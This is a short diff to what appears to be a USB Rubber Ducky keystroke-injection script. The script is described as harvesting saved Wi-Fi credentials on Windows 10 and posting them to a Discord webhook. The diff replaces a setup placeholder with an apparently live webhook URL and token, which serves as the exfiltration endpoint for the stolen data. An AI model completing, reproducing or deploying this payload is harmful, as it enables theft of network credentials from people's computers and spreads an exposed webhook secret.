@@ -4,7 +4,7 @@ REM Description: This script collects saved WiFi info and posts results to a dis
 REM Target: Windows 10
 
 REM *SETUP*
-REM replace DISCORD_WEBHOOK_HERE with your Discord Webhook.
+REM replace https://discord.com/api/webhooks/1313312053674512415/vgyjpxZjlqSEY53Qh6hUILcM-ZgDshICT0rmMW6Zxofn9mZpu3o_1RoEJ_gQ13DXnXPy with your Discord Webhook.
 
 REM some setup for dukie script
 DEFAULT_DELAY 100
